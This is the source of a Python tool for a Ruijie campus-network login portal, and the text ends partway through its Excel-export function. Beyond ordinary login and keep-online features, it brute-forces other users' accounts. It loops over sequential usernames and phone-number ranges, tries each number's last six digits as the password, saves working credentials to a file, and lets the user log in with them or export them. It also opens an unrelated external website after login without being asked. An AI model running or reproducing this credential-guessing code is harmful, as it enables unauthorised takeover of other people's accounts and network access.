import requests
import time
import json
import os
import sys
import traceback
from urllib.parse import urlparse, parse_qs
import urllib.parse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import webbrowser
import pandas as pd
import msvcrt

def get_input(prompt=""):
    """安全的控制台输入函数"""
    print(prompt, end='', flush=True)
    line = ''
    while True:
        if msvcrt.kbhit():
            char = msvcrt.getwche()
            if char == '\r':  # 回车键
                msvcrt.putwch('\n')  # 显示换行
                break
            elif char == '\b':  # 退格键
                if line:
                    line = line[:-1]
                    msvcrt.putwch(' ')  # 清除字符
                    msvcrt.putwch('\b')  # 移动光标
            else:
                line += char
    return line.strip()

def log_error(error_msg):
    """记录错误日志"""
    try:
        with open('error.log', 'a', encoding='utf-8') as f:
            f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] {error_msg}")
            if isinstance(error_msg, Exception):
                f.write(f"\n{traceback.format_exc()}")
            f.write("\n" + "-"*50 + "\n")
    except:
        pass

class RuijieLogin:
    def __init__(self):
        try:
            self.session = requests.Session()
            self.config = self.load_config()
            self.base_url = self.get_base_url()  # 从用户输入获取基础URL
            self.headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
            }
            self.user_index = None
            self.website_opened = False
            self.blacklist = self.load_blacklist()
        except Exception as e:
            log_error(e)
            raise Exception("初始化失败，请检查配置文件和网络连接")

    def get_base_url(self):
        """获取基础URL"""
        try:
            if os.path.exists("server_info.json"):
                with open("server_info.json", "r", encoding='utf-8-sig') as f:
                    info = json.load(f)
                    if info.get("base_url"):
                        print(f"使用已保存的服务器地址: {info['base_url']}")
                        return info["base_url"]

            print("\n" + "="*50)
            print("首次运行配置")
            print("="*50)
            print("请打开校园网登录页面，复制完整的登录页面地址")
            print("示例: http://xxx.xxx.xxx.xxx/eportal/index.jsp?...")
            url = get_input("\n请输入登录页面地址: ")
            
            if not url:
                print("未输入地址，使用默认地址")
                return "http://117.176.173.90"
                
            # 提取基础URL
            parsed = urllib.parse.urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # 获取并保存服务器信息
            try:
                print("\n正在获取服务器信息...")
                response = requests.get(url)
                response.encoding = 'utf-8'
                
                # 默认参数
                default_params = {
                    "wlanuserip": "56f612a932b7d3ec8e232485653751e6",
                    "wlanacname": "5dc9caef3bd4106d",
                    "ssid": "6df0cf847581946d",
                    "nasip": "7024fe9f8950a9135e7b5fdecbcfd3c2",
                    "mac": "265c5f41118c00dac16b62629104179c",
                    "t": "wireless-v2",
                    "url": "4f50e7e209d6026c2aed3d53b953da2e02f1f653208a811036a5f6f968ad89c941d241e44de40cd4aeeb912afffb733e74e0ce257318455f0d1188f013d90579"
                }
                
                # 从URL中提取参数
                query_params = urllib.parse.parse_qs(parsed.query)
                url_params = {}
                for param in ["wlanuserip", "wlanacname", "ssid", "nasip", "mac", "t", "url"]:
                    if param in query_params:
                        url_params[param] = query_params[param][0]
                
                # 合并参数，优先使用URL中的参数
                params = {**default_params, **url_params}
                
                # 保存服务器信息
                server_info = {
                    "base_url": base_url,
                    "params": params,
                    "last_updated": time.strftime('%Y-%m-%d %H:%M:%S')
                }
                
                with open("server_info.json", "w", encoding='utf-8-sig') as f:
                    json.dump(server_info, f, indent=4, ensure_ascii=False)
                
                print("✅ 服务器信息已保存")
                return base_url
                
            except Exception as e:
                log_error(f"获取服务器信息失败: {str(e)}")
                print(f"❌ 获取服务器信息失败: {str(e)}")
                print("使用默认地址")
                return "http://117.176.173.90"
                
        except Exception as e:
            log_error(f"获取基础URL失败: {str(e)}")
            print(f"❌ 获取基础URL失败: {str(e)}")
            print("使用默认地址")
            return "http://117.176.173.90"

    def load_config(self):
        """加载配置文件"""
        try:
            config_path = "config.json"
            if not os.path.exists(config_path):
                # 创建默认配置文件
                default_config = {
                    "username": "",
                    "password": "",
                    "retry_interval": 60,  # 重试间隔（秒）
                    "max_workers": 5       # 最大线程数
                }
                with open(config_path, "w", encoding='utf-8-sig') as f:
                    json.dump(default_config, f, indent=4, ensure_ascii=False)
                print("请在config.json中填写账号密码")
                sys.exit(1)
            
            with open(config_path, "r", encoding='utf-8-sig') as f:
                config = json.load(f)
                # 确保所有必需的配置项都存在
                if not all(key in config for key in ["username", "password", "retry_interval", "max_workers"]):
                    raise ValueError("配置文件缺少必需的配置项")
                return config
                
        except json.JSONDecodeError as e:
            log_error(f"配置文件解析错误: {str(e)}")
            # 尝试删除并重新创建配置文件
            try:
                os.remove(config_path)
                print("检测到配置文件损坏，已删除旧文件")
                return self.load_config()  # 递归调用创建新的配置文件
            except:
                raise Exception("配置文件格式错误且无法自动修复，请手动删除config.json后重试")
        except Exception as e:
            raise Exception(f"加载配置文件失败: {str(e)}")

    def save_config(self):
        """保存配置到文件"""
        try:
            with open("config.json", "w", encoding='utf-8-sig') as f:
                json.dump(self.config, f, indent=4, ensure_ascii=False)
            print("✅ 配置已保存")
            return True
        except Exception as e:
            log_error(f"保存配置失败: {str(e)}")
            print(f"❌ 保存配置失败: {str(e)}")
            return False

    def load_blacklist(self):
        """加载黑名单"""
        try:
            blacklist_file = "blacklist.json"
            if not os.path.exists(blacklist_file):
                # 创建默认黑名单文件
                default_blacklist = {
                    "accounts": [],  # 黑名单账号列表
                    "last_updated": time.strftime('%Y-%m-%d %H:%M:%S')
                }
                with open(blacklist_file, "w", encoding='utf-8-sig') as f:
                    json.dump(default_blacklist, f, indent=4, ensure_ascii=False)
                return default_blacklist
            
            with open(blacklist_file, "r", encoding='utf-8-sig') as f:
                blacklist = json.load(f)
                # 确保黑名单格式正确
                if not isinstance(blacklist, dict):
                    raise ValueError("黑名单格式错误")
                if "accounts" not in blacklist:
                    blacklist["accounts"] = []
                if "last_updated" not in blacklist:
                    blacklist["last_updated"] = time.strftime('%Y-%m-%d %H:%M:%S')
                return blacklist
                
        except json.JSONDecodeError as e:
            log_error(f"黑名单文件解析错误: {str(e)}")
            # 尝试删除并重新创建黑名单文件
            try:
                os.remove(blacklist_file)
                print("检测到黑名单文件损坏，已删除旧文件")
                return self.load_blacklist()  # 递归调用创建新的黑名单文件
            except:
                print("❌ 黑名单文件损坏且无法自动修复")
                return {
                    "accounts": [],
                    "last_updated": time.strftime('%Y-%m-%d %H:%M:%S')
                }
        except Exception as e:
            log_error(f"加载黑名单失败: {str(e)}")
            print(f"❌ 加载黑名单失败: {str(e)}")
            print("使用默认空黑名单")
            return {
                "accounts": [],
                "last_updated": time.strftime('%Y-%m-%d %H:%M:%S')
            }

    def save_blacklist(self):
        """保存黑名单"""
        try:
            self.blacklist["last_updated"] = time.strftime('%Y-%m-%d %H:%M:%S')
            with open("blacklist.json", "w", encoding='utf-8-sig') as f:
                json.dump(self.blacklist, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            log_error(f"保存黑名单失败: {str(e)}")
            print(f"❌ 保存黑名单失败: {str(e)}")
            return False

    def get_query_string(self):
        """获取登录参数"""
        try:
            # 默认参数
            default_params = {
                "wlanuserip": "56f612a932b7d3ec8e232485653751e6",
                "wlanacname": "5dc9caef3bd4106d",
                "ssid": "6df0cf847581946d",
                "nasip": "7024fe9f8950a9135e7b5fdecbcfd3c2",
                "mac": "265c5f41118c00dac16b62629104179c",
                "t": "wireless-v2",
                "url": "4f50e7e209d6026c2aed3d53b953da2e02f1f653208a811036a5f6f968ad89c941d241e44de40cd4aeeb912afffb733e74e0ce257318455f0d1188f013d90579"
            }
            
            # 尝试从保存的服务器信息中获取参数
            if os.path.exists("server_info.json"):
                with open("server_info.json", "r", encoding='utf-8-sig') as f:
                    info = json.load(f)
                    if info.get("params"):
                        # 合并参数，优先使用保存的参数
                        params = {**default_params, **info["params"]}
                        return params
            
            # 如果没有保存的参数，则从服务器获取
            response = self.session.get(f"{self.base_url}/eportal/index.jsp")
            response.encoding = 'utf-8'
            
            if "wlanuserip" not in response.text:
                return default_params
            
            # 提取所有必需的参数
            url_params = {}
            for param in ["wlanuserip", "wlanacname", "ssid", "nasip", "mac", "t", "url"]:
                start = response.text.find(param + "=")
                if start != -1:
                    start += len(param) + 1
                    end = response.text.find("&", start)
                    if end == -1:
                        end = response.text.find('"', start)
                    if end != -1:
                        url_params[param] = response.text[start:end]
            
            # 合并参数，优先使用从服务器获取的参数
            params = {**default_params, **url_params}
            
            # 保存新获取的参数
            if os.path.exists("server_info.json"):
                with open("server_info.json", "r", encoding='utf-8-sig') as f:
                    info = json.load(f)
                info["params"] = params
                info["last_updated"] = time.strftime('%Y-%m-%d %H:%M:%S')
                with open("server_info.json", "w", encoding='utf-8-sig') as f:
                    json.dump(info, f, indent=4, ensure_ascii=False)
            
            return params
                
        except Exception as e:
            log_error(f"获取登录参数失败: {str(e)}")
            return default_params

    def login(self, skip_select=False, is_test=False):
        """登录功能"""
        try:
            if not skip_select:
                if not os.path.exists('test_results.txt'):
                    print("\n❌ 未找到测试结果")
                    print("💡 请先进行账号测试")
                    return False
                
                accounts = []
                current_account = None
                
                with open('test_results.txt', 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line.startswith('账号:'):
                            if current_account:
                                accounts.append(current_account.copy())
                            current_account = {'username': line.split(':')[1].strip()}
                        elif line.startswith('密码:') and current_account:
                            current_account['password'] = line.split(':')[1].strip()
                            accounts.append(current_account.copy())
                            current_account = None
                
                if not accounts:
                    print("\n❌ 未找到可用账号")
                    print("💡 请先进行账号测试")
                    return False

                # 显示可用账号列表
                print("\n" + "="*50)
                print("📋 可用账号列表:")
                print("="*50)
                
                for i, account in enumerate(accounts, 1):
                    print(f"{i}. {account['username']}")
                
                # 选择账号
                while True:
                    try:
                        choice = get_input("\n请选择要登录的账号序号 (0返回): ")
                        if choice == '0':
                            return False
                        
                        index = int(choice) - 1
                        if 0 <= index < len(accounts):
                            # 保存原始账号信息
                            original_username = self.config['username']
                            original_password = self.config['password']
                            
                            # 使用选择的账号
                            account = accounts[index]
                            self.config['username'] = account['username']
                            self.config['password'] = account['password']
                            break
                        else:
                            print("❌ 无效的序号")
                    except ValueError:
                        print("❌ 请输入有效的数字")
        except Exception as e:
            print(f"❌ 发生错误: {str(e)}")
            return False

        params = self.get_query_string()
        if not params:
            log_error("获取登录参数失败")
            return False

        login_url = f"{self.base_url}/eportal/InterFace.do?method=login"
        
        try:
            session = requests.Session()
            
            # 构建完整的认证参数
            data = {
                "method": "login",
                "userId": self.config["username"],
                "password": self.config["password"],
                "service": "",
                "queryString": urllib.parse.urlencode(params),
                "operatorPwd": "",
                "operatorUserId": "",
                "validcode": "",
                "passwordEncrypt": "false",
                "strTypeAu": "",  # 从源码看到的额外参数
                "authorMode": "",  # 从源码看到的额外参数
                "isNoDomainName": "",  # 从源码看到的额外参数
                **params,  # 展开认证参数
                "jsVersion": "4.1.3",
                "timestamp": str(int(time.time() * 1000))
            }
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': self.base_url,
                'Referer': f'{self.base_url}/eportal/index.jsp?{urllib.parse.urlencode(params)}'
            }
            
            response = session.post(login_url, data=data, headers=headers)
            response.encoding = 'utf-8'
            
            try:
                result = response.json()
                
                if result.get("result") == "success":
                    self.user_index = result.get("userIndex", "")
                    print(f"{time.strftime('%Y-%m-%d %H:%M:%S')} 登录成功")
                    
                    if not is_test and not self.website_opened:
                        webbrowser.open("https://www.sk5201314.com")
                        self.website_opened = True
                    
                    return True
                else:
                    error_msg = result.get("message", "未知错误")
                    log_error(f"登录失败: {error_msg}")
                    print(f"登录失败: {error_msg}")
                    return False
                    
            except json.JSONDecodeError as e:
                log_error(f"响应格式错误: {str(e)}\n响应内容: {response.text}")
                print(f"❌ 响应格式错误: {response.headers.get('Content-Type')}")
                return False
            
        except requests.RequestException as e:
            log_error(f"网络请求异常: {str(e)}")
            print(f"网络请求异常: {str(e)}")
            return False
        except Exception as e:
            log_error(f"登录异常: {str(e)}")
            print(f"登录异常: {str(e)}")
            return False

    def test_account_range(self):
        """测试账号范围"""
        print("\n" + "="*50)
        print("账号测试")
        print("="*50)
        
        # 保存原始账号信息
        original_username = self.config["username"]
        original_password = self.config["password"]
        
        # 定义结果文件
        result_file = "test_results.txt"
        
        print("\n执行初始化测试...")
        print(f"使用账号 {original_username} 进行测试登录")
        
        # 先用当前账号测试
        if not self.login(skip_select=True, is_test=True):  # 初始化测试也不打开网站
            print("初始化登录失败，终止测试")
            return
        
        print("测试登录成功")
        print("正在退出登录...")
        
        if not self.logout():
            print("初始化退出失败，终止测试")
            return
        
        print("初始化完成")
        print("等待 5 秒后开始测试...")
        time.sleep(5)
        
        base_account = original_username[:-2]
        
        print("\n开始测试...")
        print(f"测试范围: {base_account}00 - {base_account}99")
        
        # 创建计数器
        success_count = 0
        exist_count = 0
        total_count = 0
        
        try:
            for i in range(100):
                total_count += 1
                test_account = f"{base_account}{i:02d}"
                test_password = test_account[-6:]
                
                # 使用独立的会话
                session = requests.Session()
                
                result = self.test_single_account(test_account, test_password)
                
                if result:
                    success_count += 1
                else:
                    exist_count += 1
                
                # 实时显示进度
                print(f"\r当前进度: {total_count:3d}/100 | "
                      f"成功: {success_count:3d} | "
                      f"失败: {exist_count:3d}", end='')
                
                # 每测试10个账号暂停一下，避免请求过快
                if total_count % 10 == 0:
                    time.sleep(2)
                
        except KeyboardInterrupt:
            print("\n用户中断测试")
        
        # 写入本次测试统计
        try:
            with open(result_file, 'a', encoding='utf-8') as f:
                f.write("\n本次测试统计:\n")
                f.write(f"完成时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"总计测试: {total_count} 个账号\n")
                f.write(f"登录成功: {success_count} 个\n")
                f.write(f"登录失败: {exist_count} 个\n")
                if total_count > 0:  # 避免除零错误
                    f.write(f"成功率: {success_count/total_count:.1%}\n")
                f.write("="*50 + "\n\n")
        except:
            print("保存统计结果失败")
            
        # 恢复原始账号信息
        self.config["username"] = original_username
        self.config["password"] = original_password
        
        # 打印统计结果
        print("\n" + "="*50)
        print("测试结果统计:")
        print(f"总计测试: {total_count} 个账号")
        print(f"登录成功: {success_count} 个")
        print(f"登录失败: {exist_count} 个")
        if total_count > 0:  # 避免除零错误
            print(f"成功率: {success_count/total_count:.1%}")
        print("="*50)
        print(f"\n结果已保存到: {result_file}")
        
        input("\n按回车键返回主菜单...")

    def test_phone_range(self):
        """测试指定手机号范围"""
        print("\n" + "="*50)
        print("手机号范围测试")
        print("="*50)
        
        # 保存原始账号信息
        original_username = self.config["username"]
        original_password = self.config["password"]
        
        # 定义结果文件
        result_file = "test_results.txt"
        
        print("\n执行初始化测试...")
        print(f"使用账号 {original_username} 进行测试登录")
        
        # 先用当前账号测试
        if not self.login(skip_select=True, is_test=True):  # 初始化测试也不打开网站
            print("初始化登录失败，终止测试")
            return
        
        print("测试登录成功")
        print("正在退出登录...")
        
        if not self.logout():
            print("初始化退出失败，终止测试")
            return
        
        print("初始化完成")
        print("等待 5 秒后开始测试...")
        time.sleep(5)
        
        # 获取基础账号和手机号范围
        print("\n请输入测试参数:")
        print("-"*30)
        print("当前账号格式示例: SCXY19508265612")
        print("账号结构: SCXY + 手机号")
        base_account = get_input("账号前缀 (输入 SCXY): ")
        
        if base_account != "SCXY":
            print("\n❌ 错误: 账号前缀必须是 SCXY")
            return
        
        start_phone = get_input("起始手机号 (11位): ")
        end_phone = get_input("结束手机号 (11位): ")
        
        try:
            # 验证手机号格式
            if not (len(start_phone) == 11 and len(end_phone) == 11):
                print("\n❌ 错误: 请输入11位手机号")
                return
            
            start_num = int(start_phone)
            end_num = int(end_phone)
            
            if start_num > end_num:
                print("\n注意: 起始号码大于结束号码，已自动调整顺序")
                start_num, end_num = end_num, start_num
            
        except ValueError:
            print("\n❌ 错误: 请输入有效的手机号")
            return
        
        print("\n开始测试...")
        print(f"测试范围: {base_account}{start_num} - {base_account}{end_num}")
        
        # 写入本次测试信息
        with open(result_file, 'a', encoding='utf-8') as f:
            f.write("\n" + "="*50 + "\n")
            f.write(f"测试时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"测试范围: {base_account}{start_num} - {base_account}{end_num}\n")
            f.write("-"*50 + "\n")
        
        # 创建计数器
        success_count = 0
        exist_count = 0
        total_count = 0
        
        try:
            for phone in range(start_num, end_num + 1):
                total_count += 1
                test_account = f"{base_account}{phone}"
                test_password = str(phone)[-6:]
                
                # 使用独立的会话
                session = requests.Session()
                
                result = self.test_single_account(test_account, test_password)
                
                if result:
                    success_count += 1
                else:
                    exist_count += 1
                
                # 实时显示进度
                print(f"\r当前进度: {total_count:3d}/{end_num - start_num + 1} | "
                      f"成功: {success_count:3d} | "
                      f"失败: {exist_count:3d}", end='')
                
                # 每测试10个账号暂停一下，避免请求过快
                if total_count % 10 == 0:
                    time.sleep(2)
                
        except KeyboardInterrupt:
            print("\n用户中断测试")
        
        # 写入本次测试统计
        try:
            with open(result_file, 'a', encoding='utf-8') as f:
                f.write("\n本次测试统计:\n")
                f.write(f"完成时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"总计测试: {total_count} 个账号\n")
                f.write(f"登录成功: {success_count} 个\n")
                f.write(f"登录失败: {exist_count} 个\n")
                if total_count > 0:  # 避免除零错误
                    f.write(f"成功率: {success_count/total_count:.1%}\n")
                f.write("="*50 + "\n\n")
        except:
            print("保存统计结果失败")
            
        # 恢复原始账号信息
        self.config["username"] = original_username
        self.config["password"] = original_password
        
        # 打印统计结果
        print("\n" + "="*50)
        print("测试结果统计:")
        print(f"总计测试: {total_count} 个账号")
        print(f"登录成功: {success_count} 个")
        print(f"登录失败: {exist_count} 个")
        if total_count > 0:  # 避免除零错误
            print(f"成功率: {success_count/total_count:.1%}")
        print("="*50)
        print(f"\n结果已保存到: {result_file}")
        
        input("\n按回车键返回主菜单...")

    def test_single_account(self, username, password=None):
        """测试单个账号"""
        try:
            if username in self.blacklist["accounts"]:
                print(f"⚠️ 账号 {username} 在黑名单中，跳过测试")
                return False
            
            if not password:
                password = username[-6:]
            
            original_username = self.config['username']
            original_password = self.config['password']
            
            self.config['username'] = username
            self.config['password'] = password
            
            print(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] 测试账号: {username}")
            result = self.login(skip_select=True, is_test=True)
            
            if result:
                with open('test_results.txt', 'a', encoding='utf-8') as f:
                    f.write(f"\n账号: {username}\n")
                    f.write(f"密码: {password}\n")
                    f.write(f"测试时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("-"*30 + "\n")
                print(f"✅ 测试成功，正在退出登录...")
                self.logout()
            else:
                self.add_to_blacklist(username)
                print(f"❌ 测试失败，已将账号 {username} 加入黑名单")
            
            self.config['username'] = original_username
            self.config['password'] = original_password
            
            return result
            
        except Exception as e:
            log_error(f"测试账号 {username} 时发生错误: {str(e)}")
            print(f"测试账号 {username} 时发生错误: {str(e)}")
            return False

    def logout(self):
        """退出功能"""
        try:
            print(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] 正在退出登录...")
            
            if not self.user_index:
                print("未获取到用户索引，请先登录")
                return False
            
            # 每次退出都创建新的会话
            session = requests.Session()
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': f'{self.base_url}/eportal/success.jsp?userIndex={self.user_index}'
            }
            
            # 先获取 offlineurl
            try:
                info_url = f'{self.base_url}/eportal/InterFace.do?method=getOnlineUserInfo'
                info_response = session.get(info_url)
                info_response.encoding = 'utf-8'
                info = info_response.json()
                offline_url = info.get('offlineurl', '')
            except:
                offline_url = ''
            
            # 构造退出请求
            data = {
                'method': 'logout',
                'userIndex': self.user_index,
                'ms2g': offline_url  # 添加 ms2g 参数
            }
            
            print("退出请求参数:")
            print(json.dumps(data, indent=2, ensure_ascii=False))
            
            response = session.post(
                f"{self.base_url}/eportal/InterFace.do?method=logout",
                data=data,
                headers=headers,
                timeout=5
            )
            response.encoding = 'utf-8'
            
            print("\n退出结果:")
            print(json.dumps(response.json(), indent=2, ensure_ascii=False))
            
            if "success" in response.text.lower() or "用户已不在线" in response.text:
                print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 退出成功")
                if "用户已不在线" in response.text:
                    print("(用户本就不在线)")
                
                # 退出成功后重定向到登出页面
                if offline_url:
                    logout_page = f"{self.base_url}/eportal/logout.jsp?ms2g={offline_url}"
                    print(f"正在跳转到登出页面: {logout_page}")
                    session.get(logout_page)
                
                self.user_index = None  # 清除用户索引
                return True
            else:
                print("退出失败")
                if "message" in response.text:
                    try:
                        result = response.json()
                        print(f"错误信息：{result.get('message', '未知错误')}")
                    except:
                        print(f"错误信息：{response.text}")
                return False
            
        except Exception as e:
            log_error(f"退出异常: {str(e)}")
            print(f"退出异常: {str(e)}")
            if 'response' in locals():
                print(f"响应内容: {response.text}")
            return False

    def keep_online(self):
        """保持在线功能"""
        try:
            print("开始自动登录，每隔 {} 秒检查一次...".format(self.config['retry_interval']))
            print("提示: 按 Ctrl+C 可以返回主菜单")
            
            if not self.login(skip_select=False):
                log_error("初始登录失败")
                print("初始登录失败")
                return
            
            print("初始登录成功")
            
            while True:
                try:
                    is_online, status = self.check_online_status()
                    current_time = time.strftime('%Y-%m-%d %H:%M:%S')
                    
                    if is_online:
                        print(f"[{current_time}] 当前状态: {status}，{self.config['retry_interval']}秒后重新检查")
                    else:
                        print(f"[{current_time}] 当前状态: {status}，尝试重新登录")
                        if not self.login(skip_select=True):
                            log_error(f"[{current_time}] 重新登录失败")
                            print(f"[{current_time}] ❌ 重新登录失败")
                        else:
                            print(f"[{current_time}] ✅ 重新登录成功")
                    
                    time.sleep(self.config["retry_interval"])
                    
                except KeyboardInterrupt:
                    print("\n用户中断运行")
                    self.logout()
                    break
                except Exception as e:
                    log_error(f"保持在线时发生错误: {str(e)}")
                    print(f"\n程序异常: {str(e)}")
                    print("5秒后重试...")
                    time.sleep(5)
                    
        except Exception as e:
            log_error(f"保持在线功能异常: {str(e)}")
            print(f"保持在线功能异常: {str(e)}")

    def check_online_status(self):
        """检查在线状态"""
        try:
            # 每次检查都创建新的会话
            session = requests.Session()
            
            # 构造请求头
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            # 获取在线用户信息
            info_url = f'{self.base_url}/eportal/InterFace.do?method=getOnlineUserInfo'
            info_response = session.get(info_url, headers=headers, timeout=5)
            info_response.encoding = 'utf-8'
            
            try:
                info = info_response.json()
                if info.get('result') == 'success' and info.get('userIndex'):
                    return True, "在线"
                else:
                    return False, "离线"
            except json.JSONDecodeError:
                return False, "响应解析失败"
                
        except requests.Timeout:
            return False, "请求超时"
        except requests.RequestException as e:
            return False, f"网络错误: {str(e)}"
        except Exception as e:
            return False, f"检查失败: {str(e)}"

    def show_menu(self):
        """显示主菜单"""
        while True:
            print("\n" + "="*50)
            print("锐捷校园网认证系统")
            print("="*50)
            print("1. 登录并保持在线")
            print("2. 执行一次登录")
            print("3. 执行退出登录")
            print("4. 修改配置信息")
            print("5. 账号测试(00-99)")
            print("6. 手机号范围测试")
            print("7. 导出测试结果")
            print("8. 黑名单管理")
            print("9. 更新服务器信息")
            print("0. 退出程序")
            print("="*50)
            
            choice = get_input("请选择操作 (0-9): ")
            
            if choice == "1":
                print("\n开始保持在线...")
                print("提示: 按 Ctrl+C 可以返回主菜单")
                try:
                    self.keep_online()
                except KeyboardInterrupt:
                    print("\n返回主菜单...")
                    continue
                    
            elif choice == "2":
                print("\n执行一次登录...")
                if self.login():
                    print("登录成功")
                get_input("\n按回车键返回主菜单...")
                
            elif choice == "3":
                print("\n执行退出登录...")
                if self.logout():
                    print("退出成功")
                get_input("\n按回车键返回主菜单...")
                
            elif choice == "4":
                self.modify_config()
                
            elif choice == "5":
                self.test_account_range()
                
            elif choice == "6":
                self.test_phone_range()
                
            elif choice == "7":
                self.export_results_to_excel()
                get_input("\n按回车键返回主菜单...")
                
            elif choice == "8":
                self.manage_blacklist()
                
            elif choice == "9":
                self.update_server_info()
                
            elif choice == "0":
                print("\n正在退出程序...")
                if self.user_index:  # 如果当前有登录的账号
                    choice = get_input("是否同时退出校园网? (y/n): ").lower()
                    if choice == 'y':
                        if self.logout():
                            print("已安全退出登录")
                        else:
                            print("退出登录失败")
                    else:
                        print("保持在线状态")
                break
                
            else:
                print("\n无效的选择，请重试")
                time.sleep(1)

    def modify_config(self):
        """修改配置信息"""
        while True:
            print("\n" + "="*50)
            print("修改配置信息")
            print("="*50)
            print(f"当前配置:")
            print(f"1. 用户名: {self.config['username']}")
            print(f"2. 密码: {'*' * len(self.config['password'])}")
            print(f"3. 重试间隔: {self.config['retry_interval']}秒")
            print(f"4. 最大线程数: {self.config.get('max_workers', 5)}个")
            print("0. 返回主菜单")
            print("="*50)
            
            choice = get_input("请选择要修改的项目 (0-4): ")
            
            if choice == "1":
                username = get_input("请输入新的用户名: ")
                if username:
                    self.config['username'] = username
                    self.save_config()
                    
            elif choice == "2":
                password = get_input("请输入新的密码: ")
                if password:
                    self.config['password'] = password
                    self.save_config()
                    
            elif choice == "3":
                try:
                    interval = int(get_input("请输入新的重试间隔(秒): "))
                    if interval > 0:
                        self.config['retry_interval'] = interval
                        self.save_config()
                    else:
                        print("重试间隔须大于0")
                except ValueError:
                    print("请输入有效的数字")
                    
            elif choice == "4":
                try:
                    workers = int(get_input("请输入最大线程数 (1-20): "))
                    if 1 <= workers <= 20:
                        self.config['max_workers'] = workers
                        self.save_config()
                    else:
                        print("线程数必须在1-20之间")
                except ValueError:
                    print("请输入有效的数字")
                    
            elif choice == "0":
                break
            
            else:
                print("无效的选择")
                continue
            
            if get_input("\n是否继续修改配置？(y/n): ").lower() != 'y':
                break

    def manage_blacklist(self):
        """管理黑名单"""
        while True:
            print("\n" + "="*50)
            print("黑名单管理")
            print("="*50)
            print("1. 查看黑名单")
            print("2. 添加账号到黑名单")
            print("3. 从黑名单移除账号")
            print("4. 清空黑名单")
            print("0. 返回主菜单")
            print("="*50)
            
            choice = get_input("请选择操作 (0-4): ")
            
            if choice == "1":
                print("\n当前黑名单:")
                print("-"*30)
                if not self.blacklist["accounts"]:
                    print("黑名单为空")
                else:
                    for i, account in enumerate(self.blacklist["accounts"], 1):
                        print(f"{i}. {account}")
                print(f"\n最后更新: {self.blacklist.get('last_updated', '未知')}")
                
            elif choice == "2":
                account = get_input("\n请输入要加入黑名单的账号: ")
                if account:
                    self.add_to_blacklist(account)
                
            elif choice == "3":
                if not self.blacklist["accounts"]:
                    print("\n黑名单为空")
                    continue
                    
                print("\n当前黑名单:")
                for i, account in enumerate(self.blacklist["accounts"], 1):
                    print(f"{i}. {account}")
                    
                try:
                    index = int(get_input("\n请输入要移除的账号序号: ")) - 1
                    if 0 <= index < len(self.blacklist["accounts"]):
                        self.remove_from_blacklist(self.blacklist["accounts"][index])
                    else:
                        print("❌ 无效的序号")
                except ValueError:
                    print("❌ 请输入有效的数字")
                
            elif choice == "4":
                if get_input("确定要清空黑名单吗？(y/n): ").lower() == 'y':
                    try:
                        self.blacklist["accounts"] = []
                        if self.save_blacklist():
                            print("✅ 黑名单已清空")
                        else:
                            print("❌ 黑名单清空失败")
                    except Exception as e:
                        print(f"❌ 清空黑名单失败: {str(e)}")
                
            elif choice == "0":
                break
            
            else:
                print("❌ 无效的选择")
                continue
            
            if get_input("\n是否继续管理黑名单？(y/n): ").lower() != 'y':
                break

    def add_to_blacklist(self, account):
        """添加账号到黑名单"""
        try:
            if account not in self.blacklist["accounts"]:
                self.blacklist["accounts"].append(account)
                if self.save_blacklist():
                    print(f"✅ 已将账号 {account} 加入黑名单")
                else:
                    print(f"❌ 账号 {account} 加入黑名单失败")
            else:
                print(f"⚠️ 账号 {account} 已在黑名单中")
        except Exception as e:
            print(f"❌ 添加黑名单失败: {str(e)}")

    def remove_from_blacklist(self, account):
        """从黑名单中移除账号"""
        try:
            if account in self.blacklist["accounts"]:
                self.blacklist["accounts"].remove(account)
                if self.save_blacklist():
                    print(f"✅ 已将账号 {account} 从黑名单移除")
                else:
                    print(f"❌ 账号 {account} 从黑名单移除失败")
            else:
                print(f"⚠️ 账号 {account} 不在黑名单中")
        except Exception as e:
            print(f"❌ 移除黑名单失败: {str(e)}")

    def export_results_to_excel(self):
        """导出测试结果到Excel文件"""
        try:
            if not os.path.exists('test_results.txt'):
                print("\n❌ 未找到测试结果文件")
                return False
            
            accounts = []
            current_account = {}
            
            with open('test_results.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('=') or line.startswith('-'):
                        continue
                        
                    if line.startswith('账号:'):
                        if current_account:
                            accounts.append(current_account.copy())
                        current_account = {'账号': line.split(':')[1].strip()}
                    elif line.startswith('密码:'):
                        current_account['密码'] = line.split(':')[1].strip()
                    elif line.startswith('测试时间:'):
                        current_account['测试时间'] = line.split(':')[1].strip() + ':' + line.split(':')[2].strip()
